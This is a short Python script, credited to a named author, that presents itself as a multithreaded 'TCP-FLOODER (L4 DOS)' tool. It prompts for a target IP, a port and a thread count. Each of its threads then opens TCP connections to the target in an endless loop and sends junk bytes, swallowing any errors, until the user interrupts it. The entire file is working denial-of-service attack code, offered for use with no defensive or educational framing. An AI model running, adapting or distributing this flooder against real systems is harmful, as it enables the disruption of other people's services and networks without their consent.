# CREATED BY: RAMIZ UDDIN
import os, sys, time, socket, threading

def tool_header(name):
    os.system("clear")
    print("\033[1;36m" + "="*45)
    print(f"      {name.upper()}")
    print("      CREATED BY: RAMIZ UDDIN")
    print("="*45 + "\033[0m")

def flood(target, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(b"\x00" * 1024) # Send dummy data
            s.close()
        except:
            pass

def run():
    tool_header("TCP-FLOODER (L4 DOS)")
    print("\033[1;32m[*] Advanced Multithreaded TCP Flooder.\033[0m")
    
    target = input("\n\033[1;33mEnter Target IP: \033[0m")
    if not target: return
    port = int(input("Enter Target Port (default 80): ") or 80)
    threads = int(input("Enter Number of Threads (default 100): ") or 100)
    
    print(f"\n\033[1;31m[!] Flooding {target}:{port} with {threads} threads...\033[0m")
    print("[!] Press Ctrl+C multiple times to stop.")
    
    for i in range(threads):
        t = threading.Thread(target=flood, args=(target, port))
        t.daemon = True
        t.start()
        
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\033[1;31m[!] Attack Stopped.\033[0m")
    
    input("\n[Press Enter to Return]")

if __name__ == "__main__":
    run()
